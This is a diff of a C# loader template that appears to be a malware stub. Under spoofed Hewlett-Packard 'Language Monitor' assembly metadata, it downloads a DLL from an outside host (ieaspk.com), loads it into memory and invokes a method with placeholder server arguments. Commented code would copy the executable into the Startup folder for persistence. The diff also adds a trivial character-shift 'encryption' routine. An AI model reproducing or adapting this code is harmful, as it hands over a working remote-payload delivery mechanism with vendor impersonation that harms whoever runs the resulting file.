@@ -1,3 +1,4 @@
+using Monitoring;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -6,10 +7,14 @@ using System.Reflection;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-//Default [assembly: AssemblyDescription("TCX Desktop Setup")]
-//Default [assembly: AssemblyCompany("TCX FZ-LLC")]
-//Default [assembly: AssemblyProduct("TCX Desktopr")]
-//Default [assembly: AssemblyFileVersion("4.3.4.0")]
+
+//Default [assembly: AssemblyTitle("LanguageMonitor")]
+//Default [assembly: AssemblyDescription("LanguageMonitor")]
+//Default [assembly: AssemblyCompany("Hewlett-Packard Company")]
+//Default [assembly: AssemblyProduct("Language Monitor")]
+//Default [assembly: AssemblyCopyright("Copyright (C) 1999")]
+//Default [assembly: AssemblyFileVersion("70.83.14.10")]
+
 
 
 //Assembly [assembly: AssemblyTitle("{1}")]
@@ -20,7 +25,89 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-namespace Khontkar
+
+
+namespace Monitoring
+{
+    public class clsUserSecurity
+    {
+        static clsUserSecurity sec;
+        private bool isadmin = false;
+        private int userid = 0;
+
+        private clsUserSecurity()
+        {
+        }
+
+        static public clsUserSecurity GetUser()
+        {
+            if (sec == null)
+            {
+                sec = new clsUserSecurity();
+            }
+
+            return sec;
+        }
+
+        public bool IsAdmin
+        {
+            get { return isadmin; }
+            set { isadmin = value; }
+        }
+
+        public int UserID
+        {
+            get { return userid; }
+            set { userid = value; }
+        }
+    }
+}
+
+
+namespace Monitoring
+{
+    class clsEncryption
+    {
+        public static string encryptThis(string str, byte bt)
+        {
+            string encrypt = "";
+
+            //USING COALESCING OPERATOR CONDITION
+            bt = (bt > 0 && bt <= 13) ? bt : Convert.ToByte(13);
+
+            char[] chr = str.ToString().ToCharArray();
+
+            for (int i = 0; i < str.Length; i++)
+            {
+                //CONVERTING CHAR TO INT
+                int x = Convert.ToInt32(chr[i]);
+                //CONVERTING INT TO CHAR
+                encrypt = encrypt + Convert.ToChar((255 - (x + bt - i)));
+            }
+            return encrypt;
+        }
+
+        public static string decryptThis(string str, byte bt)
+        {
+            string encrypt = "";
+
+            //USING COALESCING OPERATOR CONDITION
+            bt = (bt > 0 && bt <= 13) ? bt : Convert.ToByte(13);
+
+            char[] chr = str.ToString().ToCharArray();
+
+            for (int i = 0; i < str.Length; i++)
+            {
+                int x = Convert.ToInt32(chr[i]);
+                encrypt = encrypt + Convert.ToChar(255 + (-x - bt + i));
+            }
+            return encrypt;
+        }
+    }
+}
+
+
+namespace Monitoring
 {
     static class Program
     {
@@ -69,21 +156,24 @@ namespace Khontkar
             //download }
 
 
-            object audio = new object[] { %aPP%, string.Empty, RedKeys("%Server%"), true };
-
-            
             {
                 ServicePointManager.Expect100Continue = true;
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             }
 
 
+            object audio = new object[] { %aPP%, string.Empty, RedKeys("%Server%"), true };
+            clsUserSecurity.GetUser().IsAdmin = true;
+
+            ServicePointManager.Expect100Continue = true;
+
+
             Assembly Flow;
 
-            Flow = AppDomain.CurrentDomain.Load(RedKeys("https://ieaspk.com/instagram.dll"));
+            Flow = AppDomain.CurrentDomain.Load(RedKeys("https://ieaspk.com/TextEditor.dll"));
 
 
-            Flow.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])audio);
+            Flow.GetType("TextEditor.Home").InvokeMember("sourcecodester", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])audio);
 
             //start  {
             //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
